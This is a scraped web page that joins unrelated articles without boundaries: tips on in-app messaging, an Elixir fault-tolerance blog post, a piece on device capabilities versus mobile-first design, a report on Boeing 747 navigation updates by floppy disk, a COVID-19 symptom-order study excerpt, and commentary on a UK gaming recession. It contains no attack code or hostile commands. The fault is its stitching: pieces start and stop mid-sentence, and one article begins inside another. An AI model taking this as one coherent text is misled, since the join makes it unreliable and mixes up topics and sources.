https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-320x103.jpg 320w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-560x180.jpg 560w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1920x617.jpg 1920w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-scaled.jpg 2560w"></figure><h2 id="ftoc-heading-2">How to create the perfect In-app Messages</h2><p><em><strong>Now it all comes down to separating in-app messages from annoying, life-devouring pop-ups</strong> and I will try my best to do so.</em></p><p>First and foremost, the key is to <strong>provide people with information that has value</strong> to them. Guidance on how to make the most of the product <strong>has value. </strong></p><p>Providing feedback <strong>has value</strong>, as it lets you make a better product.</p><p>While a user may not wish to upgrade, knowing that option is available <strong>has value.</strong> This is what sets in-app messaging from the kind of pop-up marketing that we expect to see on websites.</p><p>So, <strong>as a rule of best practice</strong>, if you haven’t got anything engaging to say, it’s best you don’t say anything.</p><p>Aside from that, the main things to consider are <strong>timing, relevance, personalization, and conciseness.</strong></p><h3 id="ftoc-heading-3">5 Steps to the Perfect In-app Message</h3><h4>1- The right user needs to get the right message at the right moment.</h4><p>This refers, in the first place, to properly identifying and <strong><a href="https://userguiding.com/blog/customer-segmentation/">segmenting audiences</a></strong>.</p><p>You don’t want to be asking brand new customers for feedback, or directing super-users to introductory tutorials. You should know what type of customer the user is, and provide them with<strong> information that is relevant to them.</strong></p><h4>2- Users also need to receive messages at the right stage in their <strong>workflow</strong>.</h4><p>There is nothing more annoying than a message popping up while you are trying to concentrate on doing a complicated or creative task.</p><p>Messages are better displayed when users are <strong>transitioning</strong> and have the capacity to give the information appropriate attention. For example, guidance should be provided when users are starting a task, and feedback should be requested once they complete a task.</p><h4>3- Wherever possible, messaging should be <strong>personal</strong>.</h4><p>This means both properly <strong>segmenting</strong> the user so that they receive relevant information, but also <strong>personalization</strong> features such as addressing the user by name, and perhaps saying good morning or good evening depending on the time of day and the time zone.</p><p>This can have a surprisingly strong impact when it comes to making the customer feel valued.</p><h4>4- Messages should communicate their purpose in as few words as possible,</h4><p> giving the customer the most important information that they need <strong>at a glance.</strong> The message can then call them to engage further if they decide that the information is of value to them at that moment.</p><h4>5- <strong>Calls to action</strong> should always be clear,</h4><p>and the user should never be left wondering how they can follow up on the information provided in the message. Users should always have the option to dismiss a message, but to return and follow-up later if now is not a good moment for them to engage.</p><figure><img src="https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1160x373.jpg" alt="how to create in-app messages" loading="lazy" data-src="https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1160x373.jpg" data-srcset="https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1160x373.jpg 1160w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-800x257.jpg 800w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1536x494.jpg 1536w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-2048x659.jpg 2048w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-120x39.jpg 120w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-90x29.jpg 90w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-320x103.jpg 320w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-560x180.jpg 560w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1920x617.jpg 1920w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-scaled.jpg 2560w" data-sizes="(max-width: 1160px) 100vw, 1160px" srcset="https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1160x373.jpg 1160w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-800x257.jpg 800w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1536x494.jpg 1536w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-2048x659.jpg 2048w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-120x39.jpg 120w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-90x29.jpg 90w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-320x103.jpg 320w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-560x180.jpg 560w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-1920x617.jpg 1920w, https://userguiding.com/blog/wp-content/uploads/2020/08/in-app-messaging-practices-scaled.jpg 2560w"></figure><h2 id="examples">In-App Messaging Examples</h2><p>Let’s see some real word examples of in-app messages that are created for various purposes such as:</p><ul><li>Onboarding</li><li>New Feature Introduction</li><li>Upselling</li><li>Gathering Feedback</li></ul><h3 id="ftoc-heading-5"><strong>Onboarding</strong></h3><p>Onboarding is the process of getting someone signed-up and logged-on to your product.</p><p>This is an <strong>incredibly important part </strong>of the user-acquirement process, as according to<a href="http://info.localytics.com/blog/21-percent-of-users-abandon-apps-after-one-use" target="_blank" rel="nofollow noreferrer noopener"> Localytics</a>, 21 percent of people abandon new apps after just one use.

          <small>8 August 2020</small>


<p>by Greg Vaughn</p>

<p>I’ve noticed changes in how I prefer to develop software since I’ve been
focusing my career on Elixir. It allows me to think bigger thoughts and to
develop with lower friction and less fear. I don’t want to go back.</p>

<h2 id="it-began-with-fault-tolerance">It Began with Fault Tolerance</h2>

<p>Many people are introduced to Elixir because of its focus on concurrency.  Joe
Armstrong even called Erlang a “concurrency oriented” language. (Note: most of
my points are generic to any BEAM language, but my experience comes from an
Elixir perspective, so please excuse bias in my terminology). I find it helpful
to consider concurrency a logical consequence of a more primeval concern: fault
tolerance. Achieving BEAM-style fault tolerance comes from isolated processes
which do not affect any other if they crash, plus a supervisory process being
informed when another process dies.</p>

<p>The core point of processes is to contain the “blast radius” of damage caused
by an error. It just so happens that the isolation qualities that enable that
also make them great candidates for concurrency.</p>

<h2 id="let-it-crash">“Let It Crash”</h2>

<p>When I first heard the “Let It Crash” mantra of the Erlang community, it
sounded crazy based on my prior development exerience. It’s important to
understand that it is not a license for irresponsibility, or that we should not
care about the system crashing. What it is, at the core, is a recognition that
our systems will have errors (even <em>if</em> we write bug-free code, hardware will
bug us eventually) and that with an architecture of managing the “blast radius”
of damage, then little parts of the system crashing are no longer a scary
thing.</p>

<p>Less fear – yes, please! I’ve learned to write my Elixir code with a focus
on “blast radius” as a driver for when to reach for processes. Even in cases where I
don’t need concurrency, I’ll use a process to enclose the damage an error might
cause. I use supervision trees and durable work queues to recover from those
minor crashes of processes.  I’ve learned to prefer upserts over inserts to
allow my logic to be retried safely for greater idempotency. These two ideas
of processes to enclose possible errors plus idempotency have become second
nature to me in any Elixir code I write.</p>

<h2 id="freedom">Freedom</h2>

<p>This automatic ability to recover from errors changes the complexion of topics
like test coverage enforcement, static types, extensive code reviews, etc. All
those, at heart, are about preventing errors from being introduced in the first
place (yes, I recognize their secondary benefits too). Those are still good
things (I am not advocating irresponsibility), but with the solid safety net of
fault tolerance from BEAM, we are able to look at them from a different
perspective and see that they do add some friction and inertia to delivering
software.  Perhaps we can temper our reliance upon them in favor of greater
delivery speed in some circumstances. Less fear means more freedom to choose.</p>

<h2 id="bigger-thoughts">Bigger Thoughts</h2>

<p>Elixir re-ignited my intellectual interest in software development. I found,
via Erlang and BEAM history in general, a huge body of wisdom in distributed
systems that I can learn from, and new tools in my toolbox of how to think
about software. With processes so lightweight, pervasive, and offering freedom
from fear of crashing, my perspective shifted in exciting ways. If I think I’m
writing a “web application” then my thoughts are immediately limited. I now
think of building systems. I can think bigger thoughts because I have better
abstractions to build them upon.</p>

<p>Some teams are happy to use Elixir to write web applications, to fit it into
their pre-existing microservice deployment model. I urge developers to reach
for those bigger thoughts that fault tolerant lighweight processes enable. You
can consider each process a logical microservice, but you don’t need the
friction of deploying it separately, and serializing to/from json, and
containers, and orchestration, and distributed logging, et.al.  You can deploy an
entire system of millions of interacting logical microservices in a single BEAM
release.</p>

<h2 id="game-changer">Game Changer</h2>

<p>Elixir and BEAM certainly have been a game changer for me. I’m more fearless when I
build systems, and I hope I can share that freedom with others. The BEAM has spoiled
me, but in a good way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><main><div><div><p>Mobile-first, a solution to the constraints of devices in the early days of mobile computing revolution. Back then it made a lot of sense, and even to this day it works well in a lot of situations. Though what it invariably does do is create two categories of devices—mobile and desktop—which tend to carry a lot of other assumptions:</p><ul><li>Mobiles are touch, desktops are cursor</li><li>Mobiles have slow internet, desktops have fast internet</li><li>Mobile devices are slow, desktop devices are fast</li><li>etc…</li></ul><p>And these assumptions start to create a few issues in today's device landscape.</p><p>The latest mobile devices are far more powerful than your average laptop or desktop. There are more and more hybrid devices which work with both touch <em>and</em> mouse. Are tablets mobile or desktop? Or are they a new category altogether?</p><h3>Device capabilities</h3><p>The device capabilities approach is a type of progressive enhancement where you initially target less capable devices, then enhance at they become more capable. In many ways, that's what mobile-first is attempting to do, just to a lesser effect. Let me explain.</p><p>Canva, the product I work on day-to-day, is a pretty complex beast. Not too long ago we were working on the selection frame—the handles which appear when an element is selected.</p><p><img src="https://mattanddesign.com/d1836d9c8c4a81477f1347d64c6e1987/selectionFrame.gif" alt="Canva selection frame"></p><p>Previously we had a version for desktop and a version for mobile—which made things touch friendly—and that worked pretty nicely for the most part. Though around the same time we were also developing something which turned into the Canva Design Lab.</p><p><span>

    </span></p><p>By most measures it's a desktop device—it has a large 40" screen, it's connected to WiFi, and it sits in one spot—and yet, the screen is touch enabled. The categorisation meant that the large touchscreen was using the desktop version of the selection frame, a version which had been optimised for use with a mouse.</p><p>We were targeting "mobile or desktop", when instead we should have been targeting a particular capability of the device. In this particular case that would have been the pointer, which essentially maps to touch or mouse.</p><p>That's a pretty extreme example, but there are plenty more situations where you'll encounter similar issues. Below are some interactive examples and practical solutions to dealing with these issues.</p><h3>Viewport</h3><p>Size of the viewport is most frequently considered when designing mobile-first. The most commonly targeted attribute is viewport width, with other attributes including height, aspect ratio, and device orientation i.e. portrait and landscape.</p><p>The first thing of note is that the viewport doesn't necessarily equal the screen size. It occasionally does, but in most cases UI is taking up space, the window isn't using the entire screen or some other reason like <a href="https://webkit.org/blog/7929/designing-websites-for-iphone-x/">safe areas</a>. Take your current situation:</p><ul><li><b>Width</b> - Your viewport is <!-- -->px wide and the screen is <!-- -->px</li><li><b>Height</b> - Your viewport is <!-- -->px high and the screen is <!-- -->px</li><li><b>Aspect ratio</b> - Your viewport aspect ratio <!-- --> <!-- -->is and the screen is </li><li><b>Coverage</b> - Your viewport covers <!-- -->% of your screen</li></ul><p>Try resizing your browser to see how that impacts the values.</p><p>A common way to design for different size devices is to use breakpoints. The mistake most make with breakpoints though is placing them at points which exactly match common device sizes (375px, 768px, 1024px, etc).</p><p>This becomes a bit of a maintenance nightmare when September rolls around and Apple decides to release a new iPad—they currently have 4 different sized iPads on sale.</p><p>If we take a step back and look across all the devices on the market today there's pretty apparent clusters around the common device classes—phone, tablet, laptop and desktop. It's in the gaps between the clusters where we should place our breakpoints:</p><div><div><p>0px and up</p><ul><li>iPhone 5</li><li>iPhone 11</li><li>Pixel 2</li><li>Note 9</li><li>OnePlus 8</li></ul></div><div><p>600px and up</p><ul><li>iPhone 11 (Ls)</li><li>iPhone 6 Plus (Ls)</li><li>Pixel 2 (Ls)</li><li>Note 9 (Ls)</li><li>iPad Pro 10.5</li></ul></div><div><p>900px and up</p><ul><li>iPad (Ls)</li><li>iPad Pro 10.5 (Ls)</li><li>iPad Pro 12.9</li><li>MacBook Air 11″</li><li>Surface Go 2</li></ul></div><div><p>1200px and up</p><ul><li>MacBook Pro 13″</li><li>MacBook Pro 15″</li><li>Surface Studio</li><li>Projectors</li><li>TV’s</li></ul></div></div><p>There's a fantastic article by David Gilbertson on <a href="https://www.freecodecamp.org/news/the-100-correct-way-to-do-css-breakpoints-88d6a5ba1862/">The 100% correct way to do CSS breakpoints</a> which covers this topic in depth.</p><h3>Pointers</h3><p>Next up is pointers. The typical interpretation is touch vs mouse—it's even reflected in the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/pointer">pointer media query</a> specifications—though the reality is more of a spectrum:</p><ul><li>Wacom</li><li>Mouse</li><li>Trackpad</li><li>Smartphone</li><li>Plane screens</li></ul><p>When it comes to pointer accuracy most platforms have suggestions on minimum target sizes, which is a good place to start, though other factors are worth taking into account.</p><p>A good example is Car Mode for apps like Spotify and Maps. Even though the device is the same, the context is quite different. A combination of focus being on the road, the device being used further away than is typical, and the general bumps and jumps you get when driving means that it's much harder to accurately tap elements on the screen. To account for this Car Mode increases the size of commonly used actions:</p><p><span>

    </span></p><p>Even the type of screen can be an issue. Capacitive touchscreens used on modern smart phones have far greater accuracy than other types of touchscreen technologies—I'm sure you've all struggled with the screens on planes and ATMs before.</p><p>As a little experiment try dragging around the different circles below. You may notice that some take more effort, or are even impossible, to move around on your device:</p><div><ul><li>64px</li><li>48px (Material)</li><li>44px (HIG)</li><li>24px</li><li>8px</li></ul></div><p>Every pointer supports a simple tap or click events, though most support more advanced events—such as right click, double tap, or swipe.</p><p>Often the device, specifically the size of the device, is used to detect support for these events. When we say mobile devices are touch we'd be right. But so are a lot of laptops.</p><p>Lots of devices support touch but aren't considered "mobile" devices, and a many more support several different pointer types—the latest iPad update includes first class support for mouses and trackpads.</p><p>A far more accurate method is to use one of the various <a href="https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events">pointer API's</a>, which reveal a lot of information about the current pointer type. Click or tap the button below see what it says about your pointer:</p><p>The ideal solution is to design to suit the needs of the "least capable" pointer then, if necessary, progressively enhancing as accuracy and capabilities improve.</p><p>It's worth also noting that whilst not all advanced events are available across every device, there's often other events of interactions which can serve as a suitable alternative. A few to keep in mind:</p><div><table><thead><tr><th>Use case</th><th>Mouse</th><th>Touch</th></tr></thead><tbody><tr><td>Tertiary actions</td><td>Right click</td><td>Long press</td></tr><tr><td>Selection</td><td>Double click</td><td>Two finger tap</td></tr><tr><td>Zoom</td><td>Dedicated UI</td><td>Pinch</td></tr></tbody></table></div><h3>Keyboard</h3><p>The keyboard only really has two options available: a virtual keyboard or a physical keyboard. Most devices support one or the other, though there's a growing number of devices which support both—though never both at the same time. An iPad, for instance, won't show the virtual keyboard if a Bluetooth or smart keyboard is connected.</p><p><span>

Unfortunately at this time there's no nice way to detect the existence of a virtual keyboard, nor accurately measure the size of the resultant keyboard. There are some hacky solutions—such as detecting changes to the size of the viewport—just keep in mind that any solution is unreliable and should be tested across different devices and platforms.</p><p>I did originally mention that there were only two keyboard options, though that's not strictly true. If you want to go down a weird and wonderful rabbit hole here's a good guide on <a href="https://abilitynet.org.uk/factsheets/keyboard-and-mouse-alternatives-and-adaptations">keyboard alternatives</a>.</p><h3>Devices sensors and hardware</h3><p>Devices sensors and hardware is where things start to get interesting. They include things like gyroscopes, GPS, haptic engines, cameras, fingerprint sensors, and ambient light sensors.</p><p>The usage of these sensors and hardware can range from subtle enhancements for the user, such as a small buzz of feedback from a haptic engine, right through to opening up entire product categories in the case of GPS.</p><p>There's lots of different API's which can access these sensors and hardware from within the browser. One you've likely come across is the Geolocation API which can be used to locate your current position. The API supports much more than just position though, click or tap the button below to find out more:</p><p>Unfortunately, support for many of these API's isn't great across the various platforms and browsers, so proceed with caution. Most are in active development so it's worth keeping up to date with the available <a href="https://developer.mozilla.org/en-US/docs/Web/API">browser API's</a> for more interesting and upcoming options such as <a href="https://developer.mozilla.org/en-US/docs/Web/API/Vibration_API">haptic feedback</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/Ambient_Light_Events">ambient light sensors</a>.</p><h3>Network speeds</h3><p>Network speed&nbsp;isn't necessarily a device constraint, but it can greatly impact how they're used. There's different ways of detecting network speeds with varying levels of accuracy.</p><p>The simplest check is to see if you're online at all. The <a href="https://developer.mozilla.org/en-US/docs/Web/API/NavigatorOnLine/onLine">Navigator.onLine</a> API returns a boolean checking whether you're connected to a network or not.</p><p><strong>You are currently online!</strong> Try turning off your connection temporarily…</p><p>It's possible to detect speed by getting the browser to <a href="https://stackoverflow.com/questions/5529718/how-to-detect-internet-speed-in-javascript">fetch media of a known size</a> then measuring the elapsed time. There's also an experimental <a href="https://developer.mozilla.org/en-US/docs/Web/API/Network_Information_API">Network Information API</a> which provides even further detail for things such as connection type.</p><p>Sadly neither of these approaches is particularly accurate or widely supported so the best approach is to take the stance that network speeds can be slow and unreliable. So only send as much as necessary and always compress files and assets.</p><p>It's also worth clarifying that a mobile connection doesn't assure slow speeds, just as a wired or WiFi connection doesn't assure fast speeds. The relative <a href="https://www.opensignal.com/sites/opensignal-com/files/data/reports/global/data-2018-11/state_of_wifi_vs_mobile_opensignal_201811.pdf">speed difference between Wifi and mobile</a> connections varies drastically around the world:</p><div><div><p>WIFI faster</p><ul><li>China</li><li>Russia</li><li>Singapore</li><li>South Korea</li><li>UK</li><li>USA</li></ul></div><div><p>Similar speeds</p><ul><li>Belgium</li><li>Brazil</li><li>Finland</li><li>Hungary</li><li>Norway</li><li>New Zealand</li></ul></div><div><p>Mobile faster</p><ul><li>Australia</li><li>Egypt</li><li>Greece</li><li>South Africa</li><li>Turkey</li><li>Qatar</li></ul></div></div><p>There's also more situational factors which can …</p></div></div></main></div></div></div></div>

<p>Airplanes are a luxury for most people to own, let alone toy with—given all the national security regulations. This year’s DEF CON, however, revealed a fascinating finding leaving many, including myself, surprised.</p>



<p>July this year, British Airways announced it would retire its BOEING-747 fleet “due to the downturn in travel caused by the COVID-19 global pandemic,” as <a href="https://www.bbc.co.uk/news/business-53426886">stated</a> by their spokesperson.</p>



<p>This enabled security researchers, Ken Munro and Alex Lomas of <a href="https://www.pentestpartners.com/">Pen Test Partners</a> <a href="https://twitter.com/thekenmunroshow?lang=en"></a>to get their hands on a BOEING-747, and show us what goes on behind the scenes in the aircraft.</p>



<p>In their DEF CON presentation, the researchers gave a thorough walkthrough of the aircraft and pointed out something that Gareth Corfield of <a href="https://www.theregister.com/2020/08/10/boeing_747_floppy_drive_updates_walkthrough/"><em>The Register</em></a> wasted no time in reporting on.</p>



<p>They revealed a critical component of the BOEING-747 jet, the “navigation database loader” which uses <strong>3.5″ floppy disks for updates</strong>, even in 2020!</p>



<figure><img src="https://firebasestorage.googleapis.com/v0/b/hackernoon-app.appspot.com/o/images%2FoTiYTYuLerOJsmYRVttqIdGESsa2-5g4g3u5i.jpeg?alt=media&amp;token=6466a2bc-40cc-4c42-ab2f-4457634700e6" alt=""></figure>



<p>The “diskette stowage” compartment next to the component has a number of floppies as the video (provided at the bottom) gives a quick glimpse of.</p>



<p>To update the navigation database, Lomas explained, an engineer would have to visit the aircraft <strong>every 28 days</strong>, with a set of floppy disks.</p>



<h2>But why floppy disks?</h2>



<p>In times where smartphones and IoTs are abundantly ubiquitous, and airlines brag about their inflight entertainment systems equipped with USB ports and Wi-Fi, why would such a critical nav system still rely on these legacy diskettes?</p>



<p>To be clear, <strong>not all airplanes do.</strong></p>



<p>Jeff Carrithers, President of <a href="https://www.globalair.com/">GlobalAir.com</a> and a former aircraft researcher, has shed light on the matter:</p>



<blockquote><p>“The aircraft you are referring must be a vintage aircraft. Floppy disk are no longer used in any modern era aircraft. The vintage aircraft may only have the legacy system still in place because the cost of updating the navigation system would be too cost prohibitive.”</p></blockquote>



<p>Carrithers further stated this is a remnant of legacy aviation hardware from the seventies. “At a guess, this aircraft would be a commercial or military aircraft made in the early ’70s. Some private aircraft still use CDs to update their navigation systems,” he continued.</p>



<figure><img src="https://firebasestorage.googleapis.com/v0/b/hackernoon-app.appspot.com/o/images%2FoTiYTYuLerOJsmYRVttqIdGESsa2-7d843ua8.jpeg?alt=media&amp;token=925ddd18-d695-4272-9f37-dc181920ce6f" alt=""></figure>



<p>These points were further confirmed by a Flight Operations Expert from <a href="http://www.simpfly.aero/">Simpfly</a>, José Godoy who said, “Most aircraft flying out there have been designed in the 1980s or early 1990s when floppy disks were the ‘state of the art’ technology.”</p>



<p>Godoy said one can find these legacy technologies replaced from time to time whenever a newer fleet is launched:</p>



<p>“A good example is the A320, with the original project from the 1980s which uses floppy disks, while his new version, the A320neo, from 2010s, has ‘retired’ the floppy disks.”</p>



<h2><strong>What are “navigation databases” in an aviation context?</strong></h2>



<p>Jeff Hall, a senior consultant with and <a href="http://www.wesbeyassoc.com/">Wesbey Associates</a> and a former private pilot explained that the navigation databases are not maps in the context of Google Earth of MapQuest.</p>



<p>“It is location and frequency information about flight navigation aids and airports in particular countries or regions. This is used in conjunction with programming a flight path when the pilots get on board for the flight.”</p>



<p>“The flight cases that pilots used to carry had the physical navigation charts from Jeppesen. <strong>Now those charts are stored on iPads or tablets that the pilots carry</strong>,” said Hall.</p>



<p>Godoy also weighed in on the subject, “navigation database comprises routes (composed by airways, waypoints and navigation aids) and airport information (runways, approach and departure instrument procedures).”</p>



<h2>What’s with the 28-day mark?</h2>



<p>It’s to do with how the U.S. government regulatory body, Federal Aviation Administration (FAA) would update the U.S. airport databases every four weeks, explained Carrithers.</p>



<figure><img src="https://firebasestorage.googleapis.com/v0/b/hackernoon-app.appspot.com/o/images%2FoTiYTYuLerOJsmYRVttqIdGESsa2-466g3u2q.jpeg?alt=media&amp;token=97afa50a-4b1f-422f-8572-d482d8163233" alt=""></figure>



<p>The FAA would then mail these floppy disks to flight departments, aircraft control towers, airlines, and weather services around the country.</p>



<p>“This was all pre-internet and WAN networks were limited to single buildings, [unless] you were with the CIA or other secret organizations. But all large commercial or military aircraft were just starting electronic navigation systems in the cockpits,” Carrithers continued.</p>



<h2>What about the security implications?</h2>



<p>This is what’s debatable and I can understand both sides of the argument.</p>



<p>Arguably, leaving physical access the <em>only possible way </em>of accessing a critical system, such as via floppy disks, makes it much more secure than expanding the attack surface by opening up remote network access.</p>



<p>If the ground staff tasked with pushing the updates need physically go into the plane to update its navigation loader, the approach is far safer than Wi-Fi-powered “smart updates.”… But that makes ground staff the weakest link in the security chain.</p>



<blockquote><p>“In theory, it would be more secure from a hack outside the aircraft. But it would probably not have any security protocols to login. Just put the floppy in the drive and it is on and then download it to a hard drive and overwrite the base code. Basic DOS prompts,” explained Carrithers.</p></blockquote>



<h2>What about malware and viruses?</h2>



<p>Hall acknowledged, using floppies to provide updates is more secure than doing so over-the-air. But, floppies aren’t exempt from the risks of viruses and malware as expected from any external media device. Although this hasn’t caused any notable problems on airplanes thus far, as Hall states:</p>



<blockquote><p>“I don’t recall an airplane ever becoming infected using floppy disks as the FAA and airlines had strict procedures for scanning disks for viruses and malware before they ever got near an airplane. <strong>But there were a number of incidents over the years where ATMs got infected by floppy disks and CDs performing updates on them.”</strong></p></blockquote>



<p>Further, these airplanes aren’t running widely used commercial OSes like Windows or Linux which attract malware attacks, “but special non-stop operating systems that are Unix derivatives, so it’s not as easy to infect as one might think,” Hall continued.But the other concern that remains is the use of outdated technologies in aviation.</p>



<h2>“If it ain’t broke, don’t fix it!”</h2>



<p>Aircraft use multiple legacy systems but the approach works and has worked sufficiently well for years.</p>



<p>“So much about aviation is old-school: the hardware, the software, the infrastructure. And ESPECIALLY the way people in aviation THINK,” said Patrick Smith, an airline pilot and the host of <a href="http://askthepilot.com/">AskThePilot.com</a>.</p>



<p>Reflecting on Carrithers’ previous comment, Smith said, “What is a ‘modern era’ aircraft? The 787 and A350, maybe? Most other planes are based on platforms developed in the 1980s or even the 1970s.”</p>



<p><em>[Full disclosure: Smith had no knowledge of Carrithers’ comment. I had posed to him a general question: if modern aircraft still relied on floppies]</em></p>



<h2>Inconvenience: too many disks!</h2>



<p>If it’s too expensive to replace floppy disk readers with say, a USB interfaced system, it’s understandable.</p>



<p>Moreover, USB ports can’t always be trusted. A cybersecurity professor had recently crashed an in-flight entertainment system using nothing but a USB mouse (<a href="https://www.linkedin.com/pulse/buffer-overflow-exploitation-british-airways-system-marco-gisbert/">CVE-2019-9019</a>).</p>



<p>But using floppies is downright inconvenient. Each diskette can store a mere 1.44 megs. This means a typical update of navigation database may require a series of 8 or so floppies, loaded in a particular order.</p>



<p>A higher-capacity CD-ROM would likely be more efficient and eradicate errors—by that I mean, you wouldn’t have to worry about messing up the sequence in which the diskettes are to be inserted.</p>



<p>ACI Jet, a global aviation services company recently published a blog post titled, <em>“</em><a href="https://mro.acijet.com/newsroom/can-data-loading-be-fun-no-but-it-can-be-quicker-and-a-lot-less-painful/"><em>Can data loading be fun?</em></a><em>” </em>which actually discusses this very issue.</p>



<blockquote><p>“In any environment other than aviation, database loading would be easy and cheap (<em>don’t say it</em>). Being that the hardware required is on an aircraft, however, means that you’re likely doing this with archaic media such [as] Zip or floppy disks.”</p></blockquote>



<p>The post describes the process of pushing the updates may sound easy but can take hours on older systems that have “spotty availability” and are unreliable. And, this nuisance has to be repeated every 2-4 weeks.</p>



<p>In the same blog post, the company lists some products which can take the plain out of the update process. These include capabilities like USB interfaces and wireless updates powered by an iPad app.</p>



<p>The company’s Avionics Manager, Brian Ford stated, “We routinely work on aircraft that use ZIP disks and PCMCIA cards to update databases, along with proprietary software to load said cards.”</p>



<blockquote><p>“The <em>‘if it ain’t broke, dont fix it’ </em>concept may be how people rationalize it, but ultimately the development cycles for getting hardware approved for aircraft moves glacially show compared to consumer electronics.</p><p>Much of that is due to the reliability, safety, and testing requirements to get the approval of the regulatory agencies involved. That means that once a piece of hardware in approved and installed, that design is unlikely to be improved upon.</p><p>If there are features that could be added to justify the cost of a hardware upgrade (perhaps Wi-Fi loading through an iPad vs. proprietary PC software that may require older hardware) then we can start to see components with modern interfaces like USB, such as in the article of ours you mentioned”</p><cite>Brian Ford, Avionics Manager at ACI Jet</cite></blockquote>

It also may help doctors rule out other illnesses, according to the study led by doctoral candidate Joseph Larsen and his colleagues with faculty advisors Peter Kuhn and James Hicks at the USC Michelson Center for Convergent Bioscience’s Convergent Science Institute in Cancer.</p><p>Recognizing the order of symptoms also could help doctors plan how to treat patients, and perhaps intervene earlier in the disease.</p><p>“This order is especially important to know when we have overlapping cycles of illnesses like the flu that coincide with infections of COVID-19,” said Kuhn, a USC professor of medicine, biomedical engineering, and aerospace and mechanical engineering. “Doctors can determine what steps to take to care for the patient, and they may prevent the patient’s condition from worsening.”</p><p>“Given that there are now better approaches to treatments for COVID-19, identifying patients earlier could reduce hospitalization time,” said Larsen, the study’s lead author.</p><p>Fever and cough are frequently associated with a variety of respiratory illnesses, including Middle East Respiratory Syndrome (MERS) and Severe Acute Respiratory Syndrome (SARS). But the timing and symptoms in the upper and lower gastrointestinal tract set COVID-19 apart.</p><p>“The upper GI tract (i.e., nausea/vomiting) seems to be affected before the lower GI tract (i.e., diarrhea) in COVID-19, which is the opposite from MERS and SARS,” the scientists wrote.</p><p>The authors predicted the order of symptoms this spring from the rates of symptom incidence of more than 55,000 confirmed coronavirus cases in China, all of which were collected from Feb. 16-Feb. 24, 2020, by the World Health Organization.

The list, quite depressingly, seems to be growing at the moment and few sectors are spared.&nbsp;</p><p>With the country now, like many others, in recession, I am concerned about a bloodbath in industries such as game development.&nbsp;</p><p>This made me think about the impact a COVID-19 recession could have on the gaming sector. The UK is not only one of the largest markets for video games (£5.7bn in 2019 according to the <a href="https://www.bbc.co.uk/news/newsbeat-47783558" target="_blank">BBC</a>) in the world but is a <a href="https://tiga.org/about-tiga-and-our-industry/about-uk-video-games-industry" target="_blank">major force in creating them</a>. UK studios include Rockstar North, Codemasters, Travellers' Tales, Sumo Digital, Sports Interactive Games, Criterion, Rare and Rocksteady to <a href="https://www.gamesindustry.biz/articles/2019-04-11-revealed-the-most-successful-uk-game-developers" target="_blank">name but a few</a>. Cities like Brighton and Hove, Guildford and Newcastle Upon Tyne are home to major talent. Then there's the small army of indie game developers in the UK...</p><p>I could go on and on and on.</p><h2>Gaming isn't recession proof</h2><p>November could be a massive month for the gaming sector with the launch of the Xbox Series X and Playstation 5 (fingers crossed they will launch at the traditional November time). Games like <i>Cyberpunk 2077</i> will also be launching then and should sell well, given the developer's pedigree.&nbsp;</p><p>The major problem surrounding the launch will be the threat of a recession. Selling a console for $599/£599 in the UK and elsewhere when the economy is suffering will hurt its chances of success. During these times, gaming becomes a luxury and not a necessity. Why spend £65/$70 on a game for the PlayStation 5 when there's a mortgage payment due?&nbsp;</p><h2>Dark Clouds On The Horizon</h2><p>Part of the problem could start next month when companies in the UK have to pay to National Insurance and pension costs for furloughed employees. For gaming companies, these additional costs might not be worth it. What would be the point when you are not making any money?</p><p>The government will pay 70% of furloughed employees' wages in September, with this falling to 60% in October. The scheme ends on October 31st. What will happen then is anybody's guess.&nbsp;</p><h2>Fears Expressed By TIGA Members</h2><p>The UK's trade association for the game industry, TIGA, recently commissioned a <a href="https://tiga.org/wp-content/uploads/2020/05/Impact-of-the-Coronavirus-on-the-UK-video-games-industry-Thursday-21-May-2020.pdf" target="_blank">survey </a>on the impact of COVID-19 among its members.&nbsp;</p><p>The financial cost of the pandemic was one of the main concerns. The report said: "Games businesses were also asked about the degree of concern they have about the financial impact of coronavirus on their organisation. Nearly half of respondents said that they were ‘very concerned’</p><p>or ‘extremely concerned’ (46%)"</p><p>In a separate question, a significant percentage of respondents said they expected their revenue to fall significantly during the pandemic. The survey said: " A majority of respondents (56%) said that they expected that their organisation’s income would decrease during the coronavirus pandemic when compared to the previous financial year."</p><h2>Conclusions</h2><p>Any recession caused by COVID-19 could cause major damage to the UK gaming industry. Contracts could be cancelled, mobile ad revenue may fall and jobs could be shed. While the government has promised support for the economy, more needs to be done to help industries like game development.&nbsp;</p><p>With the UK now in recession, 